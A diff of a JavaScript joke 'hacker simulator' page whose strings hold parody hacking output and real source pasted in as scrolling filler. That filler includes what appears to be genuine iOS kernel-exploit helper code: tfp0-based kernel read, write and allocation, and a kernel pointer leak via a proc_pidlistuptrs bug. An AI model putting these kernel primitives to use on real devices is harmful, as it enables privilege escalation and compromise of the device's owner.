@@ -42,8 +42,14 @@ const denied_popup_text = "\n\n\n\n\n<font color=red>\
 
 const clippy_hello_text = "It looks like you're trying to compromise this domain, would you like me to launch hackerman.exe?";
 
-const backdoor_startup_text = "\
+const hacking_startup_text_1 = "\
 > hackerman -v -o /dev/nothing -i /proc/clippy\n\
+   __ _____  _______ _________  __  ______   _  __\n\
+  / // / _ |/ ___/ //_/ __/ _ \\/  |/  / _ | / |/ /\n\
+ / _  / __ / /__/ ,< / _// , _/ /|_/ / __ |/    / \n\
+/_//_/_/ |_\\___/_/|_/___/_/|_/_/  /_/_/ |_/_/|_/ \n";
+
+const hacking_startup_text_2 = "\n\
 Cross-compiling ROP chain from the dark cloud\n\
 Virtualising modchip to bypass the BIOS\n\
   - Rasterising\n\
@@ -62,7 +68,7 @@ const hacking_main_text = "\
 > /bin/secret/backdoor.dll -run -please\n\
   Unpacking... success\n\
 > man hacking | gcc 2>&1 | eval --unsafe\n\
-Preheating PCIE express slots... [180C]\n\
+Preheating PCIe express slots... [180C]\n\
 Select execution mode:\n\
   1) Spoof a rootkit in the blockchain\n\
   2) Emulate botnet with genetic algorithm\n\
@@ -79,11 +85,22 @@ Rootkit failure: too many firewalls!\n\
  Reverting to 18-bit compatibility mode\n\
  [███████████████████████████████████████████+██████████████████] (Hits: 1)\n\
  Segfault identified!\n\
+ Enter exploit to inject:\n\
+ > def exploit(username):\n\
+     wget www.facebook.com/$username | grep \"My favourite kind of pasta is {x}\" > passwd.txt\n\
+     FILE* f = fread(\"passwd.txt\", \"r\");\n\
+     let mut pwd:SecretString = match f {\n\
+     	NULL => console.log('Download more RAM'),\n\
+     	Some(file) => file.read(),\n\
+     }\n\
+     #define RUN login(target, \"pwd\", mode='leafOnTheWind')\n\
+     return RUN\n\
+  }\n\
+ > Compiling exploit...\n\
 This website is still under construction, there is no more content :("
 
 
-
-var RHS_hacking_content_text = "\
+var LHS_hacking_content_text = "\
 MODBUILT_NAMES=    _MODBUILT_NAMES_\n\
 MODDISABLED_NAMES= _MODDISABLED_NAMES_\n\
 MODOBJS=           _MODOBJS_\n\
@@ -639,16 +656,272 @@ regen-typeslots:\n\
 
 
 
-var LHS_hacking_content_text = "\
+var RHS_hacking_content_text = "\
+#include &lt;stdio.h>\n\
+#include &lt;stdlib.h>\n\
+#include &lt;unistd.h>\n\
+#include \"kmem.h\"\n\
+#include \"kutils.h\"\n\
+#include \"common.h\"\n\
+\n\
+mach_port_t tfp0 = MACH_PORT_NULL;\n\
+void prepare_rwk_via_tfp0(mach_port_t port)\n\
+{\n\
+    tfp0 = port;\n\
+}\n\
+void prepare_for_rw_with_fake_tfp0(mach_port_t fake_tfp0)\n\
+{\n\
+    tfp0 = fake_tfp0;\n\
+}\n\
+bool have_kmem_read()\n\
+{\n\
+    return (kmem_read_port != MACH_PORT_NULL) || (tfp0 != MACH_PORT_NULL);\n\
+}\n\
+bool have_kmem_write()\n\
+{\n\
+    return (tfp0 != MACH_PORT_NULL);\n\
+}\n\
+size_t kread(uint64_t where, void* p, size_t size)\n\
+{\n\
+    int rv;\n\
+    size_t offset = 0;\n\
+    while (offset &lt; size) {\n\
+        mach_vm_size_t sz, chunk = 2048;\n\
+        if (chunk > size - offset) {\n\
+            chunk = size - offset;\n\
+        }\n\
+        rv = mach_vm_read_overwrite(tfp0,\n\
+            where + offset,\n\
+            chunk,\n\
+            (mach_vm_address_t)p + offset,\n\
+            \&sz);\n\
+        if (rv || sz == 0) {\n\
+            LOG(\"error reading kernel @%p\", (void*)(offset + where));\n\
+            break;\n\
+        }\n\
+        offset += sz;\n\
+    }\n\
+    return offset;\n\
+}\n\
+size_t kwrite(uint64_t where, const void* p, size_t size)\n\
+{\n\
+    int rv;\n\
+    size_t offset = 0;\n\
+    while (offset &lt; size) {\n\
+        size_t chunk = 2048;\n\
+        if (chunk > size - offset) {\n\
+            chunk = size - offset;\n\
+        }\n\
+        rv = mach_vm_write(tfp0,\n\
+            where + offset,\n\
+            (mach_vm_offset_t)p + offset,\n\
+            (mach_msg_type_number_t)chunk);\n\
+        if (rv) {\n\
+            LOG(\"error writing kernel @%p\", (void*)(offset + where));\n\
+            break;\n\
+        }\n\
+        offset += chunk;\n\
+    }\n\
+    return offset;\n\
+}\n\
+bool wkbuffer(uint64_t kaddr, void* buffer, size_t length)\n\
+{\n\
+    if (tfp0 == MACH_PORT_NULL) {\n\
+        LOG(\"attempt to write to kernel memory before any kernel memory write primitives available\");\n\
+        sleep(3);\n\
+        return false;\n\
+    }\n\
+    return (kwrite(kaddr, buffer, length) == length);\n\
+}\n\
+bool rkbuffer(uint64_t kaddr, void* buffer, size_t length)\n\
+{\n\
+    return (kread(kaddr, buffer, length) == length);\n\
+}\n\
+void WriteKernel32(uint64_t kaddr, uint32_t val)\n\
+{\n\
+    if (tfp0 == MACH_PORT_NULL) {\n\
+        LOG(\"attempt to write to kernel memory before any kernel memory write primitives available\");\n\
+        sleep(3);\n\
+        return;\n\
+    }\n\
+    wkbuffer(kaddr, \&val, sizeof(val));\n\
+}\n\
+void WriteKernel64(uint64_t kaddr, uint64_t val)\n\
+{\n\
+    if (tfp0 == MACH_PORT_NULL) {\n\
+        LOG(\"attempt to write to kernel memory before any kernel memory write primitives available\");\n\
+        sleep(3);\n\
+        return;\n\
+    }\n\
+    wkbuffer(kaddr, \&val, sizeof(val));\n\
+}\n\
+uint32_t rk32_via_kmem_read_port(uint64_t kaddr)\n\
+{\n\
+    kern_return_t err;\n\
+    if (kmem_read_port == MACH_PORT_NULL) {\n\
+        LOG(\"kmem_read_port not set, have you called prepare_rk?\");\n\
+        sleep(10);\n\
+        exit(EXIT_FAILURE);\n\
+    }\n\
+    mach_port_context_t context = (mach_port_context_t)kaddr - 0x10;\n\
+    err = mach_port_set_context(mach_task_self(), kmem_read_port, context);\n\
+    if (err != KERN_SUCCESS) {\n\
+        LOG(\"error setting context off of dangling port: %x %s\", err, mach_error_string(err));\n\
+        sleep(10);\n\
+        exit(EXIT_FAILURE);\n\
+    }\n\
+    // now do the read:\n\
+    uint32_t val = 0;\n\
+    err = pid_for_task(kmem_read_port, (int*)\&val);\n\
+    if (err != KERN_SUCCESS) {\n\
+        LOG(\"error calling pid_for_task %x %s\", err, mach_error_string(err));\n\
+        sleep(10);\n\
+        exit(EXIT_FAILURE);\n\
+    }\n\
+    return val;\n\
+}\n\
+uint32_t rk32_via_tfp0(uint64_t kaddr)\n\
+{\n\
+    uint32_t val = 0;\n\
+    rkbuffer(kaddr, \&val, sizeof(val));\n\
+    return val;\n\
+}\n\
+uint64_t rk64_via_kmem_read_port(uint64_t kaddr)\n\
+{\n\
+    uint64_t lower = rk32_via_kmem_read_port(kaddr);\n\
+    uint64_t higher = rk32_via_kmem_read_port(kaddr + 4);\n\
+    uint64_t full = ((higher &lt;&lt; 32) | lower);\n\
+    return full;\n\
+}\n\
+uint64_t rk64_via_tfp0(uint64_t kaddr)\n\
+{\n\
+    uint64_t val = 0;\n\
+    rkbuffer(kaddr, \&val, sizeof(val));\n\
+    return val;\n\
+}\n\
+uint32_t ReadKernel32(uint64_t kaddr)\n\
+{\n\
+    if (tfp0 != MACH_PORT_NULL) {\n\
+        return rk32_via_tfp0(kaddr);\n\
+    }\n\
+    if (kmem_read_port != MACH_PORT_NULL) {\n\
+        return rk32_via_kmem_read_port(kaddr);\n\
+    }\n\
+    LOG(\"attempt to read kernel memory but no kernel memory read primitives available\");\n\
+    sleep(3);\n\
+    return 0;\n\
+}\n\
+uint64_t ReadKernel64(uint64_t kaddr)\n\
+{\n\
+    if (tfp0 != MACH_PORT_NULL) {\n\
+        return rk64_via_tfp0(kaddr);\n\
+    }\n\
+    if (kmem_read_port != MACH_PORT_NULL) {\n\
+        return rk64_via_kmem_read_port(kaddr);\n\
+    }\n\
+    LOG(\"attempt to read kernel memory but no kernel memory read primitives available\");\n\
+    sleep(3);\n\
+    return 0;\n\
+}\n\
+const uint64_t kernel_addr_space_base = 0xffff000000000000;\n\
+void kmemcpy(uint64_t dest, uint64_t src, uint32_t length)\n\
+{\n\
+    if (dest >= kernel_addr_space_base) {\n\
+        // copy to kernel:\n\
+        wkbuffer(dest, (void*)src, length);\n\
+    } else {\n\
+        // copy from kernel\n\
+        rkbuffer(src, (void*)dest, length);\n\
+    }\n\
+}\n\
+uint64_t kmem_alloc(uint64_t size)\n\
+{\n\
+    if (tfp0 == MACH_PORT_NULL) {\n\
+        LOG(\"attempt to allocate kernel memory before any kernel memory write primitives available\");\n\
+        sleep(3);\n\
+        return 0;\n\
+    }\n\
+    kern_return_t err;\n\
+    mach_vm_address_t addr = 0;\n\
+    mach_vm_size_t ksize = round_page_kernel(size);\n\
+    err = mach_vm_allocate(tfp0, \&addr, ksize, VM_FLAGS_ANYWHERE);\n\
+    if (err != KERN_SUCCESS) {\n\
+        LOG(\"unable to allocate kernel memory via tfp0: %s %x\", mach_error_string(err), err);\n\
+        sleep(3);\n\
+        return 0;\n\
+    }\n\
+    return addr;\n\
+}\n\
+uint64_t kmem_alloc_wired(uint64_t size)\n\
+{\n\
+    if (tfp0 == MACH_PORT_NULL) {\n\
+        LOG(\"attempt to allocate kernel memory before any kernel memory write primitives available\");\n\
+        sleep(3);\n\
+        return 0;\n\
+    }\n\
+    kern_return_t err;\n\
+    mach_vm_address_t addr = 0;\n\
+    mach_vm_size_t ksize = round_page_kernel(size);\n\
+    LOG(\"vm_kernel_page_size: %lx\", vm_kernel_page_size);\n\
+    err = mach_vm_allocate(tfp0, \&addr, ksize + 0x4000, VM_FLAGS_ANYWHERE);\n\
+    if (err != KERN_SUCCESS) {\n\
+        LOG(\"unable to allocate kernel memory via tfp0: %s %x\", mach_error_string(err), err);\n\
+        sleep(3);\n\
+        return 0;\n\
+    }\n\
+    LOG(\"allocated address: %llx\", addr);\n\
+    addr += 0x3fff;\n\
+    addr \&= ~0x3fffull;\n\
+    LOG(\"address to wire: %llx\", addr);\n\
+    err = mach_vm_wire(fake_host_priv(), tfp0, addr, ksize, VM_PROT_READ | VM_PROT_WRITE);\n\
+    if (err != KERN_SUCCESS) {\n\
+        LOG(\"unable to wire kernel memory via tfp0: %s %x\", mach_error_string(err), err);\n\
+        sleep(3);\n\
+        return 0;\n\
+    }\n\
+    return addr;\n\
+}\n\
+void kmem_free(uint64_t kaddr, uint64_t size)\n\
+{\n\
+    if (tfp0 == MACH_PORT_NULL) {\n\
+        LOG(\"attempt to deallocate kernel memory before any kernel memory write primitives available\");\n\
+        sleep(3);\n\
+        return;\n\
+    }\n\
+    kern_return_t err;\n\
+    mach_vm_size_t ksize = round_page_kernel(size);\n\
+    err = mach_vm_deallocate(tfp0, kaddr, ksize);\n\
+    if (err != KERN_SUCCESS) {\n\
+        LOG(\"unable to deallocate kernel memory via tfp0: %s %x\", mach_error_string(err), err);\n\
+        sleep(3);\n\
+        return;\n\
+    }\n\
+}\n\
+void kmem_protect(uint64_t kaddr, uint32_t size, int prot)\n\
+{\n\
+    if (tfp0 == MACH_PORT_NULL) {\n\
+        LOG(\"attempt to change protection of kernel memory before any kernel memory write primitives available\");\n\
+        sleep(3);\n\
+        return;\n\
+    }\n\
+    kern_return_t err;\n\
+    err = mach_vm_protect(tfp0, (mach_vm_address_t)kaddr, (mach_vm_size_t)size, 0, (vm_prot_t)prot);\n\
+    if (err != KERN_SUCCESS) {\n\
+        LOG(\"unable to change protection of kernel memory via tfp0: %s %x\", mach_error_string(err), err);\n\
+        sleep(3);\n\
+        return;\n\
+    }\n\
+}\n\
+\
 use crate::syntaxtree as ST;\n\
 use crate::interpreter;\n\
 use interpreter::Instruction;\n\
 #[derive(Default, Debug)]\n\
 pub struct Code {\n\
-    fwd: Vec<Instruction>,\n\
-    bkwd: Vec<Instruction>,\n\
-    f2b_links: Vec<(usize, usize)>,\n\
-    b2f_links: Vec<(usize, usize)>\n\
+    fwd: Vec&lt;Instruction>,\n\
+    bkwd: Vec&lt;Instruction>,\n\
+    f2b_links: Vec&lt;(usize, usize)>,\n\
+    b2f_links: Vec&lt;(usize, usize)>\n\
 }\n\
 impl Code {\n\
     pub fn new() -> Code {\n\
@@ -678,11 +951,11 @@ impl Code {\n\
     pub fn push_bkwd(\&mut self, x: Instruction) {\n\
         self.bkwd.push(x);\n\
     }\n\
-    pub fn append_fwd(\&mut self, mut instructions: Vec<Instruction>) {\n\
+    pub fn append_fwd(\&mut self, mut instructions: Vec&lt;Instruction>) {\n\
         self.fwd.append(\&mut instructions);\n\
     }\n\
     \n\
-    pub fn append_bkwd(\&mut self, instructions: Vec<Instruction>) {\n\
+    pub fn append_bkwd(\&mut self, instructions: Vec&lt;Instruction>) {\n\
         self.bkwd.extend(instructions.into_iter().rev());\n\
     }\n\
     pub fn fwd_len(\&mut self) -> usize {\n\
@@ -739,7 +1012,7 @@ impl ST::FractionNode {\n\
     }\n\
 }\n\
 impl ST::LookupNode {\n\
-    pub fn compile(\&self) -> Vec<Instruction> {\n\
+    pub fn compile(\&self) -> Vec&lt;Instruction> {\n\
         let mut instructions = Vec::with_capacity(self.indices.len()+1);        \n\
         for index in self.indices.iter().rev() {\n\
             instructions.extend(index.compile());\n\
@@ -752,7 +1025,7 @@ impl ST::LookupNode {\n\
     }\n\
 }\n\
 impl ST::BinopNode {\n\
-    pub fn compile(\&self) -> Vec<Instruction> {\n\
+    pub fn compile(\&self) -> Vec&lt;Instruction> {\n\
         let mut ret = Vec::new();\n\
         ret.extend(self.lhs.compile());\n\
         ret.extend(self.rhs.compile());\n\
@@ -761,7 +1034,7 @@ impl ST::BinopNode {\n\
     }\n\
 }\n\
 impl ST::ArrayLiteralNode {\n\
-    pub fn compile(\&self) -> Vec<Instruction> {\n\
+    pub fn compile(\&self) -> Vec&lt;Instruction> {\n\
         let mut ret = Vec::with_capacity(self.items.len() + 1);\n\
         for item in self.items.iter().rev() {\n\
             ret.extend(item.compile());\n\
@@ -940,16 +1213,16 @@ impl ST::Module {\n\
         }\n\
     }\n\
 }\n\
-#include <stdio.h>\n\
-#include <stdlib.h>\n\
-#include <unistd.h>\n\
-#include <mach/mach.h>\n\
+#include &lt;stdio.h>\n\
+#include &lt;stdlib.h>\n\
+#include &lt;unistd.h>\n\
+#include &lt;mach/mach.h>\n\
 #include \"kmem.h\"\n\
 #include \"koffsets.h\"\n\
 #include \"kutils.h\"\n\
 #include \"find_port.h\"\n\
 #include \"common.h\"\n\
-#include <CoreFoundation/CoreFoundation.h>\n\
+#include &lt;CoreFoundation/CoreFoundation.h>\n\
 extern void NSLog(CFStringRef, ...);\n\
 #define LOG(str, args...) do { NSLog(CFSTR(\"[*] \" str \"\n\"), ##args); } while(false)\n\
 // missing headers\n\
@@ -967,9 +1240,9 @@ struct kevent_qos_s {\n\
     uint64_t ext[4]; /* filter-specific extensions */\n\
 };\n\
 #define PRIVATE\n\
-#include <sys/event.h>\n\
-#include <sys/time.h>\n\
-#include <sys/types.h>\n\
+#include &lt;sys/event.h>\n\
+#include &lt;sys/time.h>\n\
+#include &lt;sys/types.h>\n\
 struct kevent_extinfo {\n\
     struct kevent_qos_s kqext_kev;\n\
     uint64_t kqext_sdata;\n\
@@ -987,7 +1260,7 @@ static void fill_events(int n_events)\n\
         .flags = EV_ADD,\n\
         .udata = 0x2345 } };\n\
     kqueue_id_t id = 0x1234;\n\
-    for (int i = 0; i < n_events; i++) {\n\
+    for (int i = 0; i &lt; n_events; i++) {\n\
         int err = kevent_id(id, events_id, 1, NULL, 0, NULL, NULL,\n\
             KEVENT_FLAG_WORKLOOP | KEVENT_FLAG_IMMEDIATE);\n\
         if (err != 0) {\n\
@@ -1034,7 +1307,7 @@ static mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int co
         exit(EXIT_FAILURE);\n\
     }\n\
     mach_port_t* ports = malloc(sizeof(mach_port_t) * count);\n\
-    for (int i = 0; i < count; i++) {\n\
+    for (int i = 0; i &lt; count; i++) {\n\
         ports[i] = target_port;\n\
     }\n\
     struct ool_msg* msg = calloc(1, sizeof(struct ool_msg));\n\
@@ -1067,7 +1340,7 @@ static int uint64_t_compare(const void* a, const void* b)\n\
 {\n\
     uint64_t a_val = (*(uint64_t*)a);\n\
     uint64_t b_val = (*(uint64_t*)b);\n\
-    if (a_val < b_val) {\n\
+    if (a_val &lt; b_val) {\n\
         return -1;\n\
     }\n\
     if (a_val == b_val) {\n\
@@ -1081,14 +1354,14 @@ uint64_t find_port_via_proc_pidlistuptrs_bug(mach_port_t port, int disposition)\
     int n_guesses = 100;\n\
     uint64_t* guesses = calloc(1, n_guesses * sizeof(uint64_t));\n\
     int valid_guesses = 0;\n\
-    for (int i = 1; i < n_guesses + 1; i++) {\n\
+    for (int i = 1; i &lt; n_guesses + 1; i++) {\n\
         mach_port_t q = fill_kalloc_with_port_pointer(port, i, disposition);\n\
         mach_port_destroy(mach_task_self(), q);\n\
         uint64_t leaked = try_leak(i - 1);\n\
         //LOG(\"leaked %016llx\", leaked);\n\
         // a valid guess is one which looks a bit like a kernel heap pointer\n\
         // without the upper byte:\n\
-        if ((leaked < 0x00ffffff00000000) \&\& (leaked > 0x00ffff0000000000)) {\n\
+        if ((leaked &lt; 0x00ffffff00000000) \&\& (leaked > 0x00ffff0000000000)) {\n\
             guesses[valid_guesses++] = leaked | 0xff00000000000000;\n\
         }\n\
     }\n\
@@ -1102,7 +1375,7 @@ uint64_t find_port_via_proc_pidlistuptrs_bug(mach_port_t port, int disposition)\
     int best_guess_count = 1;\n\
     uint64_t current_guess = guesses[0];\n\
     int current_guess_count = 1;\n\
-    for (int i = 1; i < valid_guesses; i++) {\n\
+    for (int i = 1; i &lt; valid_guesses; i++) {\n\
         if (guesses[i] == guesses[i - 1]) {\n\
             current_guess_count++;\n\
             if (current_guess_count > best_guess_count) {\n\
@@ -1134,270 +1407,5 @@ uint64_t find_port_address(mach_port_t port, int disposition)\n\
         return find_port_via_kmem_read(port);\n\
     }\n\
     return find_port_via_proc_pidlistuptrs_bug(port, disposition);\n\
-}#include <mach/mach.h>\n\
-#include <stdio.h>\n\
-#include <stdlib.h>\n\
-#include <unistd.h>\n\
-#include \"kmem.h\"\n\
-#include \"kutils.h\"\n\
-#include \"common.h\"\n\
-#include <CoreFoundation/CoreFoundation.h>\n\
-extern void NSLog(CFStringRef, ...);\n\
-#define LOG(str, args...) do { NSLog(CFSTR(\"[*] \" str \"\n\"), ##args); } while(false)\n\
-// the exploit bootstraps the full kernel memory read/write with a fake\n\
-// task which just allows reading via the bsd_info->pid trick\n\
-// this first port is kmem_read_port\n\
-mach_port_t kmem_read_port = MACH_PORT_NULL;\n\
-void prepare_rk_via_kmem_read_port(mach_port_t port)\n\
-{\n\
-    kmem_read_port = port;\n\
-}\n\
-mach_port_t tfp0 = MACH_PORT_NULL;\n\
-void prepare_rwk_via_tfp0(mach_port_t port)\n\
-{\n\
-    tfp0 = port;\n\
-}\n\
-void prepare_for_rw_with_fake_tfp0(mach_port_t fake_tfp0)\n\
-{\n\
-    tfp0 = fake_tfp0;\n\
-}\n\
-bool have_kmem_read()\n\
-{\n\
-    return (kmem_read_port != MACH_PORT_NULL) || (tfp0 != MACH_PORT_NULL);\n\
-}\n\
-bool have_kmem_write()\n\
-{\n\
-    return (tfp0 != MACH_PORT_NULL);\n\
-}\n\
-size_t kread(uint64_t where, void* p, size_t size)\n\
-{\n\
-    int rv;\n\
-    size_t offset = 0;\n\
-    while (offset < size) {\n\
-        mach_vm_size_t sz, chunk = 2048;\n\
-        if (chunk > size - offset) {\n\
-            chunk = size - offset;\n\
-        }\n\
-        rv = mach_vm_read_overwrite(tfp0,\n\
-            where + offset,\n\
-            chunk,\n\
-            (mach_vm_address_t)p + offset,\n\
-            \&sz);\n\
-        if (rv || sz == 0) {\n\
-            LOG(\"error reading kernel @%p\", (void*)(offset + where));\n\
-            break;\n\
-        }\n\
-        offset += sz;\n\
-    }\n\
-    return offset;\n\
-}\n\
-size_t kwrite(uint64_t where, const void* p, size_t size)\n\
-{\n\
-    int rv;\n\
-    size_t offset = 0;\n\
-    while (offset < size) {\n\
-        size_t chunk = 2048;\n\
-        if (chunk > size - offset) {\n\
-            chunk = size - offset;\n\
-        }\n\
-        rv = mach_vm_write(tfp0,\n\
-            where + offset,\n\
-            (mach_vm_offset_t)p + offset,\n\
-            (mach_msg_type_number_t)chunk);\n\
-        if (rv) {\n\
-            LOG(\"error writing kernel @%p\", (void*)(offset + where));\n\
-            break;\n\
-        }\n\
-        offset += chunk;\n\
-    }\n\
-    return offset;\n\
-}\n\
-bool wkbuffer(uint64_t kaddr, void* buffer, size_t length)\n\
-{\n\
-    if (tfp0 == MACH_PORT_NULL) {\n\
-        LOG(\"attempt to write to kernel memory before any kernel memory write primitives available\");\n\
-        sleep(3);\n\
-        return false;\n\
-    }\n\
-    return (kwrite(kaddr, buffer, length) == length);\n\
-}\n\
-bool rkbuffer(uint64_t kaddr, void* buffer, size_t length)\n\
-{\n\
-    return (kread(kaddr, buffer, length) == length);\n\
-}\n\
-void WriteKernel32(uint64_t kaddr, uint32_t val)\n\
-{\n\
-    if (tfp0 == MACH_PORT_NULL) {\n\
-        LOG(\"attempt to write to kernel memory before any kernel memory write primitives available\");\n\
-        sleep(3);\n\
-        return;\n\
-    }\n\
-    wkbuffer(kaddr, \&val, sizeof(val));\n\
-}\n\
-void WriteKernel64(uint64_t kaddr, uint64_t val)\n\
-{\n\
-    if (tfp0 == MACH_PORT_NULL) {\n\
-        LOG(\"attempt to write to kernel memory before any kernel memory write primitives available\");\n\
-        sleep(3);\n\
-        return;\n\
-    }\n\
-    wkbuffer(kaddr, \&val, sizeof(val));\n\
-}\n\
-uint32_t rk32_via_kmem_read_port(uint64_t kaddr)\n\
-{\n\
-    kern_return_t err;\n\
-    if (kmem_read_port == MACH_PORT_NULL) {\n\
-        LOG(\"kmem_read_port not set, have you called prepare_rk?\");\n\
-        sleep(10);\n\
-        exit(EXIT_FAILURE);\n\
-    }\n\
-    mach_port_context_t context = (mach_port_context_t)kaddr - 0x10;\n\
-    err = mach_port_set_context(mach_task_self(), kmem_read_port, context);\n\
-    if (err != KERN_SUCCESS) {\n\
-        LOG(\"error setting context off of dangling port: %x %s\", err, mach_error_string(err));\n\
-        sleep(10);\n\
-        exit(EXIT_FAILURE);\n\
-    }\n\
-    // now do the read:\n\
-    uint32_t val = 0;\n\
-    err = pid_for_task(kmem_read_port, (int*)\&val);\n\
-    if (err != KERN_SUCCESS) {\n\
-        LOG(\"error calling pid_for_task %x %s\", err, mach_error_string(err));\n\
-        sleep(10);\n\
-        exit(EXIT_FAILURE);\n\
-    }\n\
-    return val;\n\
-}\n\
-uint32_t rk32_via_tfp0(uint64_t kaddr)\n\
-{\n\
-    uint32_t val = 0;\n\
-    rkbuffer(kaddr, \&val, sizeof(val));\n\
-    return val;\n\
-}\n\
-uint64_t rk64_via_kmem_read_port(uint64_t kaddr)\n\
-{\n\
-    uint64_t lower = rk32_via_kmem_read_port(kaddr);\n\
-    uint64_t higher = rk32_via_kmem_read_port(kaddr + 4);\n\
-    uint64_t full = ((higher << 32) | lower);\n\
-    return full;\n\
-}\n\
-uint64_t rk64_via_tfp0(uint64_t kaddr)\n\
-{\n\
-    uint64_t val = 0;\n\
-    rkbuffer(kaddr, \&val, sizeof(val));\n\
-    return val;\n\
-}\n\
-uint32_t ReadKernel32(uint64_t kaddr)\n\
-{\n\
-    if (tfp0 != MACH_PORT_NULL) {\n\
-        return rk32_via_tfp0(kaddr);\n\
-    }\n\
-    if (kmem_read_port != MACH_PORT_NULL) {\n\
-        return rk32_via_kmem_read_port(kaddr);\n\
-    }\n\
-    LOG(\"attempt to read kernel memory but no kernel memory read primitives available\");\n\
-    sleep(3);\n\
-    return 0;\n\
-}\n\
-uint64_t ReadKernel64(uint64_t kaddr)\n\
-{\n\
-    if (tfp0 != MACH_PORT_NULL) {\n\
-        return rk64_via_tfp0(kaddr);\n\
-    }\n\
-    if (kmem_read_port != MACH_PORT_NULL) {\n\
-        return rk64_via_kmem_read_port(kaddr);\n\
-    }\n\
-    LOG(\"attempt to read kernel memory but no kernel memory read primitives available\");\n\
-    sleep(3);\n\
-    return 0;\n\
-}\n\
-const uint64_t kernel_addr_space_base = 0xffff000000000000;\n\
-void kmemcpy(uint64_t dest, uint64_t src, uint32_t length)\n\
-{\n\
-    if (dest >= kernel_addr_space_base) {\n\
-        // copy to kernel:\n\
-        wkbuffer(dest, (void*)src, length);\n\
-    } else {\n\
-        // copy from kernel\n\
-        rkbuffer(src, (void*)dest, length);\n\
-    }\n\
-}\n\
-uint64_t kmem_alloc(uint64_t size)\n\
-{\n\
-    if (tfp0 == MACH_PORT_NULL) {\n\
-        LOG(\"attempt to allocate kernel memory before any kernel memory write primitives available\");\n\
-        sleep(3);\n\
-        return 0;\n\
-    }\n\
-    kern_return_t err;\n\
-    mach_vm_address_t addr = 0;\n\
-    mach_vm_size_t ksize = round_page_kernel(size);\n\
-    err = mach_vm_allocate(tfp0, \&addr, ksize, VM_FLAGS_ANYWHERE);\n\
-    if (err != KERN_SUCCESS) {\n\
-        LOG(\"unable to allocate kernel memory via tfp0: %s %x\", mach_error_string(err), err);\n\
-        sleep(3);\n\
-        return 0;\n\
-    }\n\
-    return addr;\n\
-}\n\
-uint64_t kmem_alloc_wired(uint64_t size)\n\
-{\n\
-    if (tfp0 == MACH_PORT_NULL) {\n\
-        LOG(\"attempt to allocate kernel memory before any kernel memory write primitives available\");\n\
-        sleep(3);\n\
-        return 0;\n\
-    }\n\
-    kern_return_t err;\n\
-    mach_vm_address_t addr = 0;\n\
-    mach_vm_size_t ksize = round_page_kernel(size);\n\
-    LOG(\"vm_kernel_page_size: %lx\", vm_kernel_page_size);\n\
-    err = mach_vm_allocate(tfp0, \&addr, ksize + 0x4000, VM_FLAGS_ANYWHERE);\n\
-    if (err != KERN_SUCCESS) {\n\
-        LOG(\"unable to allocate kernel memory via tfp0: %s %x\", mach_error_string(err), err);\n\
-        sleep(3);\n\
-        return 0;\n\
-    }\n\
-    LOG(\"allocated address: %llx\", addr);\n\
-    addr += 0x3fff;\n\
-    addr \&= ~0x3fffull;\n\
-    LOG(\"address to wire: %llx\", addr);\n\
-    err = mach_vm_wire(fake_host_priv(), tfp0, addr, ksize, VM_PROT_READ | VM_PROT_WRITE);\n\
-    if (err != KERN_SUCCESS) {\n\
-        LOG(\"unable to wire kernel memory via tfp0: %s %x\", mach_error_string(err), err);\n\
-        sleep(3);\n\
-        return 0;\n\
-    }\n\
-    return addr;\n\
-}\n\
-void kmem_free(uint64_t kaddr, uint64_t size)\n\
-{\n\
-    if (tfp0 == MACH_PORT_NULL) {\n\
-        LOG(\"attempt to deallocate kernel memory before any kernel memory write primitives available\");\n\
-        sleep(3);\n\
-        return;\n\
-    }\n\
-    kern_return_t err;\n\
-    mach_vm_size_t ksize = round_page_kernel(size);\n\
-    err = mach_vm_deallocate(tfp0, kaddr, ksize);\n\
-    if (err != KERN_SUCCESS) {\n\
-        LOG(\"unable to deallocate kernel memory via tfp0: %s %x\", mach_error_string(err), err);\n\
-        sleep(3);\n\
-        return;\n\
-    }\n\
-}\n\
-void kmem_protect(uint64_t kaddr, uint32_t size, int prot)\n\
-{\n\
-    if (tfp0 == MACH_PORT_NULL) {\n\
-        LOG(\"attempt to change protection of kernel memory before any kernel memory write primitives available\");\n\
-        sleep(3);\n\
-        return;\n\
-    }\n\
-    kern_return_t err;\n\
-    err = mach_vm_protect(tfp0, (mach_vm_address_t)kaddr, (mach_vm_size_t)size, 0, (vm_prot_t)prot);\n\
-    if (err != KERN_SUCCESS) {\n\
-        LOG(\"unable to change protection of kernel memory via tfp0: %s %x\", mach_error_string(err), err);\n\
-        sleep(3);\n\
-        return;\n\
-    }\n\
 }\n\
 ";
